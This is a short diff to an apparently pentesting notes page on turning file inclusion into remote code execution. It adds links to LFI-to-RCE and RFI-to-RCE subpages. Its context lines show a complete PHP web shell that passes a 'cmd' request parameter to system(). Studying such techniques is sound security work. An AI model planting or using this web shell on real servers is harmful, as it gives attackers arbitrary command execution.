@@ -86,6 +86,14 @@ As code execution functions can be filtered, the phpinfo testing phase is requir
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
+{% content-ref url="lfi-to-rce/" %}
+[lfi-to-rce](lfi-to-rce/)
+{% endcontent-ref %}
+
+{% content-ref url="rfi-to-rce.md" %}
+[rfi-to-rce.md](rfi-to-rce.md)
+{% endcontent-ref %}
+
 ## References
 
 {% embed url="https://www.acunetix.com/websitesecurity/directory-traversal" %}
